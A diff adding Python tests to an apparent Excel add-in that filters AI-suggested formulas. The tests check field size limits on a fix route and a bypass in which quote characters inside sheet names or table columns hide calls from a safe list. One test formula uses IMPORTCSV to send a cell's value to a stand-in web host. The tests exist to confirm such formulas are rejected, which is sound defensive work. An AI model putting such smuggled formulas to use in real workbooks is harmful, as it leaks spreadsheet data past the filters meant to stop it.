@@ -121,6 +121,25 @@ def test_each_fix_field_is_taken_right_up_to_its_limit_and_refused_one_past_it(m
     assert len(seen) == 3
 
 
+def test_the_fix_routes_formulas_and_reason_are_checked_up_to_their_limit_and_refused_one_past_it(monkeypatch):
+    # AH-160: 'formulas' was checked only for its length (any item, a 10 MB formula) and 'reason' not at all, though
+    # each column's name is looked for in it. The pane sends the row as Excel's formulas: a formula, or the cell itself
+    monkeypatch.setattr(client, "api_key_configured", lambda: True)
+    seen = []
+    monkeypatch.setattr(client, "suggest_fix", lambda *a, **k: seen.append(a) or {"explanation": "x", "changes": []})
+    longest = "=" + "1" * 8191  # Excel's longest formula, 8,192 characters
+    for ok in ({**BODY, "formulas": ["2026-01-07", "", longest]}, {**BODY, "formulas": [None, True, -5]},
+               {**BODY, "reason": "x" * 10_000}, {**BODY, "reason": None}):
+        assert post(ok).status_code == 200, str(ok)[:200]
+    assert seen[0][-1] == ["2026-01-07", "", longest] and seen[2][-3] == "x" * 10_000 and seen[3][-3] == ""
+    for bad in ({**BODY, "formulas": [None, None, longest + "1"]}, {**BODY, "formulas": [None, None, {}]},
+                {**BODY, "formulas": [None, [], None]}, {**BODY, "reason": "x" * 10_001}, {**BODY, "reason": 5},
+                {**BODY, "reason": {"a": 1}}):
+        r = post(bad)
+        assert r.status_code == 400 and r.get_json()["error"], str(bad)[:200]
+    assert len(seen) == 4
+
+
 def test_fix_route_503_without_key(monkeypatch):
     monkeypatch.setattr(client, "api_key_configured", lambda: False)
     r = post(BODY)
@@ -281,6 +300,23 @@ def test_an_ai_formula_naming_a_share_or_path_that_is_not_a_workbook_file_is_lef
         srv.shutdown()
     assert [c["cell"] for c in out["changes"]] == ["E3"]  # an ordinary formula is still kept
     assert "(Left out D3: the formula reached outside this workbook.)" in out["explanation"]
+
+
+@pytest.mark.parametrize("formula", ["=SUM('\"'!A1,IMPORTCSV(\"https:\"&\"//x/?\"&A2),'\"'!A1)",
+                                     '=SUM(T[a"b],COPILOT(A1),T[c"d])'])
+def test_an_ai_formula_hiding_a_call_between_quotes_in_sheet_names_or_columns_is_left_out(monkeypatch, formula):
+    # AH-160: strings were blanked before sheet names, so a " inside 'a sheet' or T[a column] opened a fake string
+    # that hid IMPORTCSV or COPILOT from the safe list, and the card kept the formula
+    wide = COLS + ["D", "E"]
+    answer = {"explanation": "x", "changes": [{"cell": "D3", "new": formula},
+                                              {"cell": "E3", "new": "='Q1 sales'!B2+SUM(Table1[it''s])"}]}
+    srv, _ = stub_api(monkeypatch, [{"type": "text", "text": json.dumps(answer)}])
+    try:
+        out = client.suggest_fix(wide, [r + ["", ""] for r in ROWS], 1, 0, 0, "", "fill D")
+    finally:
+        srv.shutdown()
+    assert [c["cell"] for c in out["changes"]] == ["E3"]  # a quote in a sheet name or a column, as Excel writes it, is kept
+    assert "(Left out D3: the formula used a function that is not on this add-in's safe list.)" in out["explanation"]
 
 
 def test_an_ai_formula_using_a_function_not_on_the_safe_list_is_left_out(monkeypatch):
